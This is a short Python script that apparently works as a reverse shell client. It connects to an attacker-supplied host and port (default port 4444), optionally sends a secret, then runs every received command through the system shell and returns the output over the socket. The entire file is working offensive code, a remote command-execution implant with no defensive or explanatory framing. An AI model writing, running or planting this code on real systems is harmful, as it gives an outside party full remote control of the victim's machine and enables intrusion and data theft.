import socket,subprocess,shlex
import os
import sys

def execute_command(cmd):
    if not cmd:
        return "No command provided."

    try:
        cwd = subprocess.check_output("pwd", shell=True).decode().strip()
        result = subprocess.run(
            cmd,
            shell=True, 
            cwd=cwd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            check=True
        )

        if result.stdout:
            return result.stdout
        else:
            return (
                result.stderr or 
                "Command executed successfully, but no output."
            )

    except subprocess.CalledProcessError as e:
        return (
            f"Command failed with return code {e.returncode}\n"
            f"{e.stderr.decode()}"
        )

if __name__ == "__main__":
    port = os.environ.get("PORT", 4444)
    host = os.environ.get("HOST", "127.0.0.1")
    secret = os.environ.get("SECRET")

    if len(sys.argv) > 2:
        host = sys.argv[1]
        port = int(sys.argv[2])


    running = True

    with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as s:
        try:
            s.connect((host, port))
            if secret:
                s.send(secret.encode())

            while running:
                data = s.recv(1024)
                if not data:
                    break
                cmd = data.decode().strip()
                match cmd:
                    case _ if cmd.startswith("cd"):
                        try:
                            path = cmd.split(" ", 1)[1]
                            os.chdir(path)
                            cwd = (
                                subprocess.check_output("pwd", shell=True)
                                .decode().strip()
                            )
                            s.sendall(cwd.encode())
                        except Exception as e:
                            s.sendall(str(e).encode())
                            continue
                    case _:
                       res = execute_command(cmd)
                       s.sendall(res.encode())
        except Exception as e:
            print(f"[-] Connection failed. {str(e)}")
            

